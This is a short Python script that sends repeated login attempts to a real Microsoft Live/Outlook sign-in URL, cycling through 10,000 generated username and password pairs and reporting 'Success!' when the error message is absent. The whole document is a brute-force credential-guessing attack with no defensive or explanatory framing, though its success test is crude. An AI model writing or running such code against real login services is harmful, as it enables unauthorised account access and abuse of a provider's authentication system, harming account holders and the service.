import requests

url = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1589741184&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3A%2F%2Foutlook.live.com%2Fowa%2F%3Fnlp%3D1%26RpsCsrfState%3D4869b6e4-0d4f-45f8-8b1f-33ecbf5d4da8&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2Cflname%2Cwld&cobrandid=90015"

for i in range(10000):
    user = "user" + str(i)
    password = "password" + str(i)

    payload = {
        "loginfmt": user,
        "passwd": password
    }

    r = requests.post(url, data=payload)

    if "Incorrect email address or password" not in r.text:
        print("Success! Username: {} Password: {}".format(user, password))
        break
    else:
        print("Trying username: {} Password: {}".format(user, password))
